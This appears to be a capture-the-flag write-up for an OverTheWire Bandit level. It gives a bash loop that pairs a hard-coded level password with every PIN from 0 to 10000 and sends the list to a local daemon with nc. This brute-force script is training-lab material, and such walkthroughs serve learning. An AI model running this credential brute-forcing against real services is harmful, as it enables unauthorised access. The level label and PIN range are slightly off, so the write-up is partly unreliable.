Challenge: Bandit level 1

Category:  linex

Points:

Difficulty: Introductory

## Instructions
A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.
You do not need to create new connections each time

## Solution
Find a way to give port 30002 all possible combos along with the password.
write a bash script that give all the combos 
 #!/bin/bash

for i in $(seq 0 10000);
do
        echo "gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $i"
done
Then put that into a text file using: ./work.sh > allposs
than give that text file the port: nc localhost 30002 < allposs
